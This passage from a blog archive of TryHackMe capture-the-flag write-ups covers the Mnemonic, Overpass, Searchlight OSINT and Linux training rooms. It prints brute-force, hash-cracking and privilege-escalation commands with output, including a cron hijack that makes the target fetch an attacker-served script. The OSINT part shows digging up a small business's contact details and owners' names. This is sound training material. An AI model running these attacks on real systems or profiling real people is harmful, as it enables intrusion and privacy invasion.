up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 11.36% done; ETC: 08:23 (0:11:11 remaining) Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 23.75% done; ETC: 08:24 (0:10:07 remaining) Nmap scan report for 10.10.89.251 Host is up (0.075s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp\topen http Apache httpd 2.4.29 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/webmasters/* |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 1337/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA) | 256 23:eb:a9:9b:45:26:9c:a2:13🆎c1:ce:07:2b:98:e0 (ECDSA) |_ 256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)   Directory Brute-Forcing  What is the name of the secret file?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  gobuster dir -u http://{TARGET MACHINE IP}-w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/29 08:13:07 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /webmasters (Status: 301) =============================================================== 2020/12/29 08:13:46 Finished ===============================================================   Continue enumeration with /webmasters\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://{TARGET MACHINE IP}/webmasters -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251/webmasters [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/29 08:15:05 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /admin (Status: 301) /backups (Status: 301) /index.html (Status: 200) =============================================================== 2020/12/29 08:15:45 Finished ===============================================================   Now we are going to look for the files with specific extensions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  gobuster dir -u http://{TARGET MACHINE IP}/webmasters/backups -x php,txt,zip,rar,sql,js,html -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.89.251/webmasters/backups [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: rar,sql,js,html,php,txt,zip [+] Timeout: 10s =============================================================== 2020/12/29 08:18:50 Starting gobuster =============================================================== . . . /backups.zip (Status: 200) . . .   FTP For cracking the found zip file we will use frackzip.\n FTP user name?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  curl http://{TARGET MACHINE IP}/webmasters/backups/backups.zip \u0026gt; backups.zip sudo apt-get install fcrackzip fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backups.zip -v \u0026#39;backups/\u0026#39; is not encrypted, skipping found file \u0026#39;backups/note.txt\u0026#39;, (size cp/uc 67/ 60, flags 9, chk 24e2) checking pw 05546TUNmaneerat PASSWORD FOUND!!!!: pw == 00385007 unzip backups.zip Archive: backups.zip creating: backups/ [backups.zip] backups/note.txt password: inflating: backups/note.txt cat note.txt 1 @vill 2 3 James new ftp username: ftpuser 4 we have to work hard   Flags used with fcrackzip:\n-D\tto crack the password using a dictionary\n-p\tto use string as initial password\n-u\tto use unzip to weed out wrong passwords\n-v\tto be more verbose\n FTP password?\n With the ftp username we are able to brute force required password with hydra.\n1 2 3 4 5 6 7 8 9 10 11  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://{TARGET MACHINE IP} Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-29 08:37:41 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.89.251:21/ [STATUS] 258.00 tries/min, 258 tries in 00:01h, 14344141 to do in 926:38h, 16 active [STATUS] 266.67 tries/min, 800 tries in 00:03h, 14343599 to do in 896:29h, 16 active [21][ftp] host: 10.10.89.251 login: ftpuser password: love4ever 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-29 08:41:50   Gaining Access SSH  What is the ssh username?\nWhat is the ssh password?\n Enumerating FTP we can find .ssh folder with id_rsa file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  ftp {TARGET MACHINE IP} Connected to 10.10.89.251. 220 (vsFTPd 3.0.3) Name (10.10.89.251:root): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-1 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-10 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-2 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-3 drwxr-xr-x 4 0 0 4096 Jul 14 18:05 data-4 drwxr-xr-x 2 0 0 4096 Jul 13 21:16 data-5 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-6 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-7 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-8 drwxr-xr-x 2 0 0 4096 Jul 13 21:17 data-9 226 Directory send OK. ftp\u0026gt; cd data-4 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 0 0 4096 Jul 14 18:05 . drwx------ 12 1003 1003 4096 Jul 14 18:22 .. drwxr-xr-x 2 0 0 4096 Jul 14 18:04 3 drwxr-xr-x 2 0 0 4096 Jul 14 18:04 4 -rwxr-xr-x 1 1001 1001 1766 Jul 13 20:34 id_rsa -rwxr-xr-x 1 1000 1000 31 Jul 13 21:18 not.txt 226 Directory send OK. ftp\u0026gt; get id_rsa   Convert the private key:\n1  ssh2john id_rsa \u0026gt; forjohn.txt   Now we can crack the SSH passphrase with john.\n1 2 3 4 5 6 7 8 9 10 11 12  john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status bluelove (id_rsa) 1g 0:00:00:06 DONE (2020-12-29 08:51) 0.1459g/s 2093Kp/s 2093Kc/s 2093KC/sa6_123..*7¡Vamos! Session completed   Now login with found credentials.\nDecoding \u0026amp; Steganography  What is the condor password?\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  james@mnemonic:~$ ls -la total 44 drwx------ 6 james james 4096 Jul 14 18:20 . drwxr-xr-x 10 root root 4096 Jul 14 18:27 .. -rw-r--r-- 1 vill vill 116 Jul 14 17:56 6450.txt lrwxrwxrwx 1 james james 9 Jul 14 18:20 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 james james 220 Jul 13 19:59 .bash_logout -rw-r--r-- 1 james james 3771 Jul 13 19:59 .bashrc drwx------ 2 james james 4096 Jul 13 22:14 .cache drwx------ 3 james james 4096 Jul 13 22:42 .gnupg drwxrwxr-x 3 james james 4096 Jul 13 21:34 .local -rw-r--r-- 1 vill vill 155 Jul 13 20:31 noteforjames.txt -rw-r--r-- 1 james james 807 Jul 13 19:59 .profile drwx------ 2 james james 4096 Jul 13 21:16 .ssh james@mnemonic:~$ cat 6450.txt 5140656 354528 842004 1617534 465318 1617534 509634 1152216 753372 265896 265896 15355494 24617538 3567438 15355494 james@mnemonic:~$ cat noteforjames.txt noteforjames.txt @vill james i found a new encryption İmage based name is Mnemonic I created the condor password. don\u0026#39;t forget the beers on saturday james@mnemonic:~$ find / -type f -name user.txt . . . find: ‘/home/condor/\u0026#39;VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==\u0026#39;’: Permission denied find: ‘/home/condor/.gnupg’: Permission denied find: ‘/home/condor/.cache’: Permission denied find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied . . .   While searching for a flag file, two files with their names encoded to base64 are revealed.\nDecoding the second file name gives us url link.\n\n\nAssuming we are going to use some steganography technique I searched for Mnemonic (room name) and found a program with identical name.\nhttps://github.com/MustafaTanguner/Mnemonic\n1  git clone https://github.com/MustafaTanguner/Mnemonic   Proceed with the help of Usage section and extract hidden text.\n\n\nUser Flag Decoding the first file name encoded to base64 gives us the user flag.\n\nPrivilege Escalation Root Flag 1  ssh condor@{TARGET MACHINE IP} -p 1337   Use password we found earlier with Mnemonic.\n1 2 3 4 5 6 7 8  condor@mnemonic:~$ sudo -l [sudo] password for condor: Matching Defaults entries for condor on mnemonic: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User condor may run the following commands on mnemonic: (ALL : ALL) /usr/bin/python3 /bin/examplecode.py   Analyze /bin/examplecode.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121  #!/usr/bin/python3 import os import time import sys def text(): #text print print(\u0026#34;\u0026#34;\u0026#34; ------------information systems script beta-------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- --------------------------------------------------- ----------------@author villwocki------------------\u0026#34;\u0026#34;\u0026#34;) time.sleep(2) print(\u0026#34;\\nRunning...\u0026#34;) time.sleep(2) os.system(command=\u0026#34;clear\u0026#34;) main() def main(): info() while True: select = int(input(\u0026#34;\\nSelect:\u0026#34;)) if select == 1: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ip a\u0026#34;) print(\u0026#34;Main Menü press \u0026#39;0\u0026#39; \u0026#34;) print(x) if select == 2: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ifconfig\u0026#34;) print(x) if select == 3: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;ip route show\u0026#34;) print(x) if select == 4: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;cat /etc/os-release\u0026#34;) print(x) if select == 0: time.sleep(1) ex = str(input(\u0026#34;are you sure you want to quit ? yes : \u0026#34;)) if ex == \u0026#34;.\u0026#34;: print(os.system(input(\u0026#34;\\nRunning....\u0026#34;))) if ex == \u0026#34;yes \u0026#34; or \u0026#34;y\u0026#34;: sys.exit() if select == 5: #root time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(2) print(\u0026#34;.......\u0026#34;) time.sleep(2) print(\u0026#34;System rebooting....\u0026#34;) time.sleep(2) x = os.system(command=\u0026#34;shutdown now\u0026#34;) print(x) if select == 6: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;date\u0026#34;) print(x) if select == 7: time.sleep(1) print(\u0026#34;\\nRunning\u0026#34;) time.sleep(1) x = os.system(command=\u0026#34;rm -r /tmp/*\u0026#34;) print(x) def info(): #info print function print(\u0026#34;\u0026#34;\u0026#34; #Network Connections [1] #Show İfconfig [2] #Show ip route [3] #Show Os-release [4] #Root Shell Spawn [5] #Print date [6] #Exit [0] \u0026#34;\u0026#34;\u0026#34;) def run(): # run function text() run()   We can spawn a root shell with these steps:\n Select option 0 Instead of agreeing write a dot character (\u0026quot;.\u0026quot;)  And we got command execution (/bin/bash -\u0026gt; root shell)\n1  condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py   \n\n","description":"I hope you have fun.","id":28,"section":"posts","tags":["enumeration","ftp","zip cracking","decoding","steganography","python","privilege escalation"],"title":"Mnemonic [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/mnemonic/"},{"content":"   Title Searchlight     Info OSINT challenges in the imagery intelligence category   Difficulty N/A    Your first challenge! There are 5 elements of IMINT that you should consider when looking at an image:\nContext\nForeground\nBackground\nMap markings\nTrial and error\n\n What is the name of the street where this image was taken?\nsl{carnaby street}\n Just Google it! \n Which city is the tube station located in?\nsl{london}\nWhich tube station do these stairs lead to?\nsl{piccadilly circus}\n Piccadilly Circus tube station  Which year did this station open?\nsl{1906}\nHow many platforms are there in this station?\nsl{4}\n Keep at it! \n YVR : https://www.yvr.ca/en/passengers\n   Which building is this photo taken in?\nsl{VANCOUVER INTERNATIONAL AIRPORT}\nWhich country is this building located in?\nsl{Canada}\nWhich city is this building located in?\nsl{Vancouver}\n Coffee and a light lunch In this task we are looking for a coffee shop somewhere in the Scotland.\n\n The Edinburgh Woolen Mill : https://www.ewm.co.uk/  \nUse Street View to see the coffee shop from the The Edinburgh Woolen Mill side.\n\n Which city is this coffee shop located in?\nsl{Blairgowrie}\n Further information found on their Facebook profile: https://www.facebook.com/weecoffeeshop/  Which street is this coffee shop located in?\nsl{Allan Street}\nWhat is their phone number?\nsl{+447878 839128}\nWhat is their email address?\nsl{theweecoffeeshop@aol.com}\nWhat is the surname of the owners?\n Let\u0026rsquo;s check out some posts and look for some names.  \n Often page owners use their private profile to interact in the comments section on ther page.    Reverse your thinking \n Which restaurant was this picture taken at?\n Uploading the picture into Google images gives us result with name and location.   sl{Katz\u0026rsquo;s Deli}\nWhat is the name of the Bon Appétit editor that worked 24 hours at this restaurant?\n sl{Andrew Knowlton}\n Locate this sculpture \n What is the name of this statue?\n  HINT: \u0026ldquo;Og når det er vind og sno Blir han så kald på nesen, Så den lyser som en glo.\u0026rdquo;\n  From this blog I found out that the statue is located in Norway: https://wonder175.blogspot.com/2019/04/norwegia-lofoty-cz-v.html\n  Pasting hint into Google search shows results for \u0026ldquo;Rudolph the Red-Nosed Reindeer\u0026rdquo;.\n  Now, search for \u0026ldquo;norway rudolph red nosed reindeer statue\u0026rdquo;.\n  In the image section we have a picture of the statue we are looking for.\n   ls{Rudolph the Chrome Nosed Reindeer sculpture}\nWho took this image?\n  HINT: If you know the location of the statue you may want to visitoslo\n  Use clickable map and look around Oslo for our scuplture: https://www.visitoslo.com/en/articles/outdoor-sculptures-in-oslo/\n   sl{Kjersti Stensrud}\n \u0026hellip;and justice for all \n What is the name of the character that the statue depicts?\n Let\u0026rsquo;s start with uploading given picture to Google Images. The first result gives us the answer for the first question: https://en.wikipedia.org/wiki/Lady_Justice  sl{Lady Justice}\nWhere is this statue located?\n HINT: the birthplace of a nation  \n Now search for \u0026ldquo;virginia lady justice statue\u0026rdquo;, we get this picture which is the same as the given one just taken from the other angle:   sl{Alexandria, Virginia}\nWhat is the name of the building opposite from this statue?\n sl{The Westin Alexandria Old Town}\n The view from my hotel room This time we are given a video showing us a view from the hotel balcony.\nProposed writeup for the tool called FFmpeg: https://nixintel.info/osint-tools/using-ffmpeg-to-grab-stills-and-audio-for-osint/\nWhile watching the video I noticed this famous building I know:\n\nIt is Marina Bay Sands hotel in Singapore.\nFrom this part of the video we can see Riverside Point and the angle of the river canal.\n\n\nZoom to our hotel location:\n\nIn the list of all hotels in the area I recognized this hotel entrance from the Street View and linked it to our hotel.\n\nAfter a quick Google search I found out the hotel name: https://novotelclarkequay.singapore-sg.com/en/#!\n What is the name of the hotel that my friend is staying in?\nsl{Hotel Novotel Singapore Clarke Quay}\n ","description":"OSINT challenges in the imagery intelligence category","id":29,"section":"posts","tags":["OSINT","images","geolocation"],"title":"Searchlight [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/searchlight/"},{"content":"   Title Overpass     Info What happens when some broke CompSci students make a password manager?   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap Let\u0026rsquo;s start with nmap:\n1 2 3 4 5 6 7  nmap -vv -sC -sV {TARGET MACHINE} PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) . . .      Flag Description     -vv for extra verbose   -sC scan for default scripts   -sV probe open ports to determine service/version info    \nGoing through the source code of the page we can find different directories:\n/aboutus\n/downloads\n/img\nAlso there is a comment probably from one of the devs, may be useful in the future:\n\nContinue with page enumeration and navigate to the Downloads folder:\n\nThe source code is written in the Go language and is easy to read.\nAt the very beginig there is a rot47 function.\nThe ROT47 (Caesar cipher by 47 chars) is a simple character substitution cipher that replaces a character within the ASCII range [33, 126] with the character 47 character after it (rotation) in the ASCII table.\nIt is an invertible algorithm i.e. applying the same algorithm to the input twice will get the origin text. (https://rot47.net)\nAlso we can download the precompiled binaries based on our operation system and run the program. In this point the best what we can do is use gobuster to check for other direcories.\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u 10.10.123.229 -w /usr/share/wordlists/dirb/comm =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.123.229 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/23 08:13:27 Starting gobuster =============================================================== /aboutus (Status: 301) /admin (Status: 301) /css (Status: 301) /downloads (Status: 301) /img (Status: 301) /index.html (Status: 301) =============================================================== 2020/12/23 08:14:04 Finished ===============================================================   And we get one more we didn\u0026rsquo;t find before: admin\n\nCommon credentials and basic SQLi inputs do not work so we will need to find another way in. Once again go through the source code of the page.\nThere are three java scripts:\n/main.js\n/login.js\n/cookie.js\nCookies exploitation The most interesting one is going to be login.js :\n\nYou can set the value in the browser: Press F12 to open dev tools -\u0026gt; Console -\u0026gt; set the value -\u0026gt; Run\n\nOr you can set the value in the command line: curl \u0026ldquo;http://{TARGET MACHINE IP}/admin/\u0026rdquo; \u0026ndash;cookie \u0026ldquo;SessionToken=hello there\u0026rdquo;\nResult is shown based on your chosen method.\n\nGaining Access Great! We have SSH key for James.\nCopy it and save to id_rsa file.\nThen change the file permisions to 600 (-rw\u0026mdash;\u0026mdash;-) with chmod 600 id_rsa command.\nSince we now it is for James we can login with his credentials:\n1  ssh -i id_rsa james@{TARGET MACHINE IP}   User flag Enter we are prompted to enter the passphrase for the key.\nWe are going to use John The Ripper (john) to bruteforce the passphrase, but first we need to convert id_rsa file to format suited for john. Locate ssh2john.py: locate ssh2john (my location: /opt/ssh2john.py)\nConvert the file: **\t/opt/ssh2john.py id_rsa \u0026gt; forjohn.txt**\nAnd crack it with rockyou.txt wordlist: **john \u0026ndash;wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt**\nIn a few seconds we get the passphrase: **james13**\nRepeat the ssh command and when prompted enter the passphrase.\nGet the user flag located in the home direcory!\nList home directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ls -la total 48 drwxr-xr-x 6 james james 4096 Jun 27 16:07 . drwxr-xr-x 4 root root 4096 Jun 27 02:20 .. lrwxrwxrwx 1 james james 9 Jun 27 02:38 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 james james 220 Jun 27 02:20 .bash_logout -rw-r--r-- 1 james james 3771 Jun 27 02:20 .bashrc drwx------ 2 james james 4096 Jun 27 04:45 .cache drwx------ 3 james james 4096 Jun 27 04:45 .gnupg drwxrwxr-x 3 james james 4096 Jun 27 04:20 .local -rw-r--r-- 1 james james 49 Jun 27 04:26 .overpass -rw-r--r-- 1 james james 807 Jun 27 02:20 .profile drwx------ 2 james james 4096 Jun 27 04:44 .ssh -rw-rw-r-- 1 james james 438 Jun 27 04:23 todo.txt -rw-rw-r-- 1 james james 38 Jun 27 16:07 user.txt   There is a file overpass contaning his encrypted password: ,LQ?2\u0026gt;6QiQ$JDE6\u0026gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.\nFrom the source code we now they used rot47 so we can decrypt it with some online tool like this one:\nhttps://www.dcode.fr/rot-47-cipher\nThe result is: [{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;System\u0026rdquo;,\u0026ldquo;pass\u0026rdquo;:\u0026ldquo;saydrawnlyingpicture\u0026rdquo;}]\nObtained Credentials: james:saydrawnlyingpicture\nPrivilege Escalation Firstly, try sudo -l to check what he can run as root.\nResponse: Sorry, user james may not run sudo on overpass-prod.\nWe are going to use auto enumeratoin script for Linux called linPEAS:\nhttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\nBut before we need to transfer this script to our target machine.\nStart python server on you machine: python3 http.server 80\nOn the target machine download the file and save it: curl {LOCAL MACHINE IP}:80/linpeas.sh \u0026gt; linpeas.sh\nAdd execution permission to linpeas script: chmod +x linpeas.sh\nNow run it: ./linpeas.sh\nReading through the colorful output there are two things we are going to link together:\n Cron job accessing overpass.thm and runing with root permisions:  \nWritable file hosts:  \nWe can impersonate overpass.thm and let the curl download our prepared script.\nModify hosts file on the target machine and replace overpass.thm IP with your own.\n\nTo make it work properly we need to simulate the directory structe in the curl command. Start with creating directories: mkdir -p downloads/src\nIn the src directory create a file: touch buildscript.sh\nIn the text editor we are going to add command we want the taget machine to execute after the curl command is piped to bash.\nEasiest way to leverage our privelegies is to add sticky bit to bash:\n\nMore on that here in the SUID section: https://gtfobins.github.io/gtfobins/bash/\nOnce again start a python server on your machine in the src folder: python3 http.server 80\nYou will be noticed when the target machine will reach to download the script:\n\nWait a minute for the system to run the cron job and get root:\n\nRoot flag Grab the root flag!\n","description":"What happens when some broke CompSci students make a password manager?","id":30,"section":"posts","tags":["enumeration","hash cracking","enumeration scripts","cron","privilege escalation"],"title":"Overpass [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/overpass/"},{"content":"   Title Linux Strength Training     Info Guided room for beginners to learn/reinforce linux command line skills.   Difficulty N\\A    Finding your way around linux Finding specific files/folders on a system based on various conditions:\n\nWhat is the correct option for finding files based on group?\n -group\n What is format for finding a file with the user named Francis and with a size of 52 kilobytes in the directory /home/francis/?\n find /home/francis -type f -user francis -size 52k\n SSH as topson using his password topson.\nGo to the /home/topson/chatlogs directory and type the following: grep -iRl \u0026lsquo;keyword\u0026rsquo;.\nWhat is the name of the file that you found using this command?\n\nType: less [filename] to open the file.\nThen, before anything, type / before typing: keyword followed by [ENTER].\nNotice how that allowed us to search for the first instance of that word in the entire document.\nWhat are the proceeding characters after the searched word you found?\n\nRead the file named \u0026lsquo;ReadMeIfStuck.txt\u0026rsquo;. What is the Flag?\n. . .\njust follow the instructions in each file\n. . .\n\nWorking with files Hypothetically, you find yourself in a directory with many files and want to move all these files to the directory of /home/francis/logs\nWhat is the correct command to do this?\n mv * /home/francis/logs\n Hypothetically, you want to transfer a file from your /home/james/Desktop/ with the name script.py to the remote machine (192.168.10.5) directory of /home/john/scripts using the username of john.\nWhat would be the full command to do this?\n scp /home/james/Desktop/script.py john@192.168.10.5:/home/john/scripts\n How would you rename a folder named -logs to -newlogs?\n mv \u0026ndash; -logs -newlogs\n How would you copy the file named encryption keys to the directory of /home/john/logs?\n cp \u0026ldquo;encryption keys\u0026rdquo; /home/john/logs\n Find a file named readME_hint.txt inside topson\u0026rsquo;s directory and read it.\nUsing the instructions it gives you, get the second flag.\n. . .\nonce again just follow the instructions\n. . .\n\nHashing (introduction) Download the hash file attached to this task and attempt to crack the MD5 hash.\nWhat is the password?\n\n\n\nSSH as sarah using: sarah@[MACHINE:IP] and use the password: rainbowtree1230x\nWhat is the hash type stored in the file hashA.txt?\n\nCrack hashA.txt using john the ripper, what is the password?\n\nWhat is the hash type stored in the file hashB.txt?\n\nFind a wordlist with the file extention of \u0026lsquo;.mnf\u0026rsquo; and use it to crack the hash with the filename hashC.txt.\nWhat is the password?\nSarah machine:\n Locate the wordlist by its extension. Change dir Move the wordlist Run simple server  1 2 3 4  find / -type f -name \u0026#34;*.mnf\u0026#34; 2\u0026gt;\u0026gt;/dev/null cd \u0026#34;/home/sarah/system AB/db\u0026#34; mv ww.mnf ~ python3 -m http.server 8080   Your machine:\n Transfer the wordlist  1  scp -p 8080 sarah@10.10.147.242:/home/sarah/ww.mnf .   \n1 2 3 4 5 6 7 8 9 10  john --format=raw-sha256 --wordlist=ww.mnf hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status unacvaolipatnuggi (?) 1g 0:00:00:00 DONE (2020-12-12 04:07) 10.00g/s 2293Kp/s 2293Kc/s 2293KC/s trisyllabically..untent Use the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably Session completed   Crack hashB.txt using john the ripper, what is the password?\n1 2 3 4 5 6 7 8 9  john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) Warning: no OpenMP support for this hash type, consider --fork=2 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status letmein (?) 1g 0:00:00:00 DONE (2020-12-12 04:10) 50.00g/s 25600p/s 25600c/s 25600C/s fuckyou1..letmein Use the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably Session completed   Decoding base64 What is the name of the tool which allows us to decode base64 strings?\n base64\n Find a file called encoded.txt.\nWhat is the special answer?\n\n Because of the last character we know the file is base64 encoded Decode the file:  1  cat \u0026#34;/home/sarah/system AB/managed/encoded.txt\u0026#34; | base64 -d \u0026gt; decoded.txt   \n Search for \u0026lsquo;special\u0026rsquo;: /special  \n\n\n\n1 2 3 4 5 6 7 8 9  john --format=raw-md4 --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD4 [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status john (?) 1g 0:00:00:00 DONE (2020-12-12 04:48) 14.28g/s 98742p/s 98742c/s 98742C/s oblivion..better Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Encryption/Decryption using gpg Now try it for yourself. Make a random text file and enter some readable sentences in there before encrypting and decrypting it as illustrated above.\n1 2 3  touch test.txt echo \u0026#39;Make a random text file and enter some readable sentences in\u0026#39; \u0026gt;\u0026gt; test.txt gpg --cipher-algo AES-256 --symmetric test.txt   You wish to encrypt a file called history_logs.txt using the AES-128 scheme.\nWhat is the full command to do this?\n1  gpg --cipher-algo AES-128 --symetric history_logs.txt   What is the command to decrypt the file you just encrypted?\n1  gpg history_logs.txt.gpg   Find an encrypted file called layer4.txt, its password is bob.\nUse this to locate the flag.\nWhat is the flag?\n\n\n\n. . .\n\n. . .\n\n1  echo \u0026#34;MS4gRmluZCBhIGZpbGUgY2FsbGVkIGxheWVyMS50eHQsIGl0cyBwYXNzd29yZCBpcyBoYWNrZWQu\u0026#34; | base64 -d   Find a file called layer1.txt, its password is hacked.\n\nCracking encrypted gpg files Encrypt a file and use a common password contained in the wordlist you wish to use.\nFollow the instructions above to decrypt as if you are a hacker.\nIf it worked, well done.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  touch secret.txt echo \u0026#34;Secret message\u0026#34; 